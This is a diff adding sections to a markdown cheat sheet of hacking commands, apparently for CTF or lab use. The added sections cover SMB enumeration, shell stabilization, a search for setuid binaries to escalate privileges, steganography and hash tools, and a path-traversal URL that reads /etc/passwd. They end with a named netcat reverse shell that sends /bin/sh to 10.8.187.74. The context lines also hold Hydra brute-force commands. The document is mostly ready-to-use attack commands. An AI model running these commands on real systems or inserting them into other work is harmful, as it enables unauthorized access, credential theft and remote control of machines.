@@ -10,6 +10,13 @@ Collection of useful penetration testing and hacking commands.
 - [Local Server](#local-server)
 - [SSH](#ssh)
 - [Hydra Brute Force](#hydra-brute-force)
+- [SMB](#smb)
+- [Stabilize shell](#stabilize-shell)
+- [Usefull bash commands](#ssefull-bash-commands)
+- [Steganography](#steganography)
+- [Hash-identifier](#hash-identifier)
+- [LFI](#lfi)
+- [Bash reverse shell](#bash-reverse-shell)
 
 ----
 
@@ -189,6 +196,84 @@ hydra -l <FOUND_USERNAME> -P <WORDLIST> <TARGET_IP> http-post-form "/wp-login.ph
 ````
 hydra -l chris -P ~/Desktop/shared/Perso-Script/wordlist/rockyou.txt ftp://10.10.17.164 -V -I
 ````
+----
+
+## SMB
+
+````
+enum4linux -U -G -S -P <cible>
+````
+
+-----
+
+## Stabilize shell
+
+- On victim
+````
+python -c "import pty; pty.spawn('/bin/bash')"
+````
+
+- Press CRTL+Z
+
+- On attacker
+````
+stty raw -echo && fg
+export TERM=xterm-256-color
+````
+
+----
+
+## Usefull bash commands
+
+- Find file
+````
+find / -type f -name "file.txt" 2>/dev/null
+````
+
+- Find bin with setuid or setgid activated (escalation)
+````
+find / -perm +6000 2>/dev/null | grep '/bin/'
+````
+
+----
+
+# Steganography
+
+````
+binwalk -e <FILE>
+````
+````
+steghide extract -sf <FILE>
+````
+
+----
+
+# Hash-identifier
+
+````
+hash-id -h <HASH>
+````
+
+[HASHES.COM](https://hashes.com/en/decrypt/hash)
+
+----
+
+# LFI
+
+````
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//etc/passwd
+````
+
+[Apache log poisoning](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)
+
+----
+
+# Bash reverse shell
+
+````
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.187.74 9000 >/tmp/f
+````
+
 ----
 
 
